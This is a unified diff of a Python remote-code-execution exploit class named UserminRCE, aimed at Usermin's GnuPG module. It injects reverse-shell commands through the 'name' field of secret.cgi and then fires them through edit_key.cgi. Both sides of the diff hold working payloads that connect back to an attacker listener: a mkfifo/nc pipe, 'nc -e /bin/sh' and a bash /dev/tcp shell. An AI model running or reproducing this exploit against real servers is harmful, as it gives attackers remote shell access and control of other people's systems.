@@ -101,7 +101,14 @@ class UserminRCE:
             )
             
             if response.status_code == 200:
-                if "webmin_search.cgi" in response.text:
+                # Use the original login check method
+                login_content = str(response.content)
+                search = "webmin_search.cgi"
+                check_login_string = re.findall(search, login_content)
+                
+                if check_login_string:
+                    # Get session cookies like the original
+                    session_hand_login = self.session.cookies.get_dict()
                     print("[+] Login successful!")
                     return True
                 else:
@@ -117,19 +124,14 @@ class UserminRCE:
 
     def generate_payload(self):
         """Generate reverse shell payload with fallback options"""
-        # Primary payload using netcat (original format)
-        primary_payload = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.listener_ip} {self.listener_port} > /tmp/f"
+        # Use the exact original payload format
+        primary_payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.listener_ip} {self.listener_port} >/tmp/f;"
         
-        # Alternative netcat payload
-        alt_netcat_payload = f"nc {self.listener_ip} {self.listener_port} -e /bin/sh"
+        # Alternative payloads for testing
+        alt_payload = f"nc {self.listener_ip} {self.listener_port} -e /bin/sh"
+        bash_payload = f"bash -i >& /dev/tcp/{self.listener_ip}/{self.listener_port} 0>&1"
         
-        # Fallback payload using bash
-        fallback_payload = f"bash -i >& /dev/tcp/{self.listener_ip}/{self.listener_port} 0>&1"
-        
-        # Simple test payload
-        test_payload = f"nc {self.listener_ip} {self.listener_port} -e /bin/bash"
-        
-        return primary_payload, alt_netcat_payload, fallback_payload, test_payload
+        return primary_payload, alt_payload, bash_payload
 
     def submit_payload(self, payload):
         """Submit the payload via GnuPG secret creation"""
@@ -138,100 +140,74 @@ class UserminRCE:
         
         secret_url = urljoin(self.base_url, "/gnupg/secret.cgi")
         
-        # Try different payload formats
-        payload_formats = [
-            {"name": f'";{payload}echo "', "email": "1337@webmin.com"},
-            {"name": f'";{payload};echo "', "email": "1337@webmin.com"},
-            {"name": f'";{payload} #', "email": "1337@webmin.com"},
-            {"name": f'";{payload}"', "email": "1337@webmin.com"},
-        ]
+        # Use the exact original payload format
+        payload_data = {
+            "name": f'";{payload}echo "',
+            "email": "1337@webmin.com",
+        }
         
-        headers = {'Referer': self.base_url}
+        print(f"[+] Payload data: {payload_data}")
         
-        for i, payload_data in enumerate(payload_formats):
-            try:
-                print(f"[*] Trying payload format {i+1}...")
-                response = self.session.post(
-                    secret_url, 
-                    data=payload_data, 
-                    headers=headers, 
-                    timeout=15
-                )
+        # Update headers like the original
+        self.session.headers.update({'referer': self.base_url})
+        
+        try:
+            response = self.session.post(
+                secret_url, 
+                data=payload_data, 
+                verify=False, 
+                timeout=15
+            )
+            
+            if response.status_code == 200:
+                # Use the original success check method
+                create_secret_content = str(response.content)
+                search = "successfully"
+                check_exp = re.findall(search, create_secret_content)
                 
-                if response.status_code == 200:
-                    if "successfully" in response.text.lower():
-                        print(f"[+] Payload submitted successfully with format {i+1}")
-                        return True
-                    else:
-                        print(f"[-] Format {i+1} failed - no success message")
-                        if "error" in response.text.lower():
-                            print("[*] Response contains error message")
+                if check_exp:
+                    print("[+] Payload submitted successfully")
+                    return True
                 else:
-                    print(f"[-] Format {i+1} failed with status code: {response.status_code}")
-                    
-            except requests.exceptions.RequestException as e:
-                print(f"[-] Format {i+1} failed: {e}")
-                continue
-        
-        print("[-] All payload formats failed")
-        return False
+                    print("[-] Payload submission failed - no success message found")
+                    return False
+            else:
+                print(f"[-] Payload submission failed with status code: {response.status_code}")
+                return False
+                
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Payload submission failed: {e}")
+            return False
 
     def get_key_id(self):
-        """Extract the key ID from the GnuPG key list"""
+        """Extract the key ID from the GnuPG key list using original method"""
         print("[+] Fetching key list to extract key ID...")
         
         list_keys_url = urljoin(self.base_url, "/gnupg/list_keys.cgi")
         
         try:
-            response = self.session.post(list_keys_url, timeout=10)
+            # Update headers like the original
+            self.session.headers.update({'referer': self.base_url})
+            response = self.session.post(list_keys_url, verify=False, timeout=10)
             
             if response.status_code == 200:
-                # Try multiple regex patterns to find key IDs
-                patterns = [
-                    r"edit_key\.cgi\?(.*?)'",  # Original pattern
-                    r"edit_key\.cgi\?([^'\"]+)",  # More flexible pattern
-                    r"edit_key\.cgi\?([a-zA-Z0-9_=&]+)",  # Alphanumeric pattern
-                    r"edit_key\.cgi\?([^>]+)",  # Until closing tag
-                ]
+                # Use the original key extraction method
+                key_list_content = str(response.content)
+                keys = re.findall("edit_key.cgi\?(.*?)'", key_list_content)
                 
-                for pattern in patterns:
-                    keys = re.findall(pattern, response.text)
-                    if keys:
-                        key_id = keys[-1]  # Get the last (most recent) key
-                        print(f"[+] Found key ID: {key_id}")
-                        return key_id
-                
-                # If no patterns worked, let's debug the response
-                print("[-] No key IDs found with standard patterns")
-                print("[*] Debugging response content...")
-                
-                # Look for any edit_key.cgi references
-                if "edit_key.cgi" in response.text:
-                    print("[*] Found edit_key.cgi references in response")
-                    # Extract a sample of the response around edit_key.cgi
-                    lines = response.text.split('\n')
-                    for i, line in enumerate(lines):
-                        if "edit_key.cgi" in line:
-                            print(f"[*] Line {i+1}: {line.strip()[:100]}...")
-                            # Try to extract manually
-                            start = line.find("edit_key.cgi?")
-                            if start != -1:
-                                start += len("edit_key.cgi?")
-                                end = line.find("'", start)
-                                if end == -1:
-                                    end = line.find('"', start)
-                                if end == -1:
-                                    end = line.find(' ', start)
-                                if end == -1:
-                                    end = len(line)
-                                
-                                key_id = line[start:end]
-                                if key_id and len(key_id) > 5:  # Basic validation
-                                    print(f"[+] Manually extracted key ID: {key_id}")
-                                    return key_id
-                
-                print("[-] Could not extract key ID from response")
-                return None
+                if keys and len(keys) >= 2:
+                    # Use [-2] like the original (second to last key)
+                    key_id = keys[-2]
+                    print(f"[+] Found key ID: {key_id}")
+                    return key_id
+                elif keys:
+                    # Fallback to last key if only one found
+                    key_id = keys[-1]
+                    print(f"[+] Found key ID (fallback): {key_id}")
+                    return key_id
+                else:
+                    print("[-] No key IDs found in response")
+                    return None
             else:
                 print(f"[-] Failed to fetch key list, status code: {response.status_code}")
                 return None
@@ -241,14 +217,17 @@ class UserminRCE:
             return None
 
     def trigger_payload(self, key_id):
-        """Trigger the payload by accessing the edit key page"""
-        print("[+] Triggering payload...")
+        """Trigger the payload by accessing the edit key page using original method"""
+        print(f"[+] Triggering payload with key ID: {key_id}")
         
         edit_key_url = urljoin(self.base_url, f"/gnupg/edit_key.cgi?{key_id}")
         
+        # Update headers like the original
+        self.session.headers.update({'referer': self.base_url})
+        
         try:
-            # Use a shorter timeout since we expect the connection to drop
-            response = self.session.post(edit_key_url, timeout=3)
+            # Use the original trigger method with timeout
+            response = self.session.post(edit_key_url, verify=False, timeout=3)
             print("[+] Payload triggered successfully")
             return True
             
@@ -276,71 +255,35 @@ class UserminRCE:
         if not self.login():
             return False
         
+        print("[+] Setting up GnuPG")
+        
         # Generate payloads
-        primary_payload, alt_netcat_payload, fallback_payload, test_payload = self.generate_payload()
+        primary_payload, alt_payload, bash_payload = self.generate_payload()
         
-        # Try different payloads
-        payloads = [
-            ("Primary netcat", primary_payload),
-            ("Alternative netcat", alt_netcat_payload),
-            ("Bash fallback", fallback_payload),
-            ("Simple test", test_payload)
-        ]
-        
-        payload_submitted = False
-        for name, payload in payloads:
-            print(f"\n[+] Trying {name} payload...")
-            if self.submit_payload(payload):
-                payload_submitted = True
-                break
+        # Try the original payload first
+        if self.submit_payload(primary_payload):
+            print("[+] Setup successful")
+            print("[+] Fetching key list")
+            
+            # Get key ID
+            key_id = self.get_key_id()
+            
+            if key_id:
+                print(f"[+] Key: {key_id}")
+                
+                # Trigger payload using original method
+                if self.trigger_payload(key_id):
+                    print("[+] 5ucc355fully_3xpl017")
+                    print(f"[+] Check your listener on {self.listener_ip}:{self.listener_port}")
+                    return True
+                else:
+                    print("[-] Failed to trigger payload")
             else:
-                print(f"[-] {name} payload failed")
+                print("[-] Failed to extract key ID")
+        else:
+            print("[-] Setup failed")
         
-        if not payload_submitted:
-            print("[-] All payloads failed")
-            return False
-        
-        # Get key ID
-        key_id = self.get_key_id()
-        
-        # Try to trigger payload with key ID if found
-        if key_id:
-            if self.trigger_payload(key_id):
-                print("[+] Exploit completed successfully!")
-                print(f"[+] Check your listener on {self.listener_ip}:{self.listener_port}")
-                return True
-            else:
-                print("[-] Failed to trigger payload with key ID")
-        
-        # Fallback: try multiple trigger methods
-        print("[!] Trying multiple fallback trigger methods...")
-        
-        trigger_urls = [
-            "/gnupg/list_keys.cgi",
-            "/gnupg/secret.cgi",
-            "/gnupg/index.cgi",
-            "/gnupg/",
-        ]
-        
-        for url in trigger_urls:
-            try:
-                print(f"[*] Trying trigger: {url}")
-                trigger_url = urljoin(self.base_url, url)
-                response = self.session.post(trigger_url, timeout=3)
-                print(f"[+] Trigger {url} completed")
-            except requests.exceptions.ReadTimeout:
-                print(f"[+] Trigger {url} timeout - reverse shell should be incoming!")
-                return True
-            except requests.exceptions.ConnectionError:
-                print(f"[+] Trigger {url} connection closed - reverse shell likely established")
-                return True
-            except Exception as e:
-                print(f"[-] Trigger {url} failed: {e}")
-                continue
-        
-        print("[+] All trigger methods attempted")
-        print("[+] Check your listener for reverse shell")
-        return True
+        return False
 
 def main():
     parser = argparse.ArgumentParser(
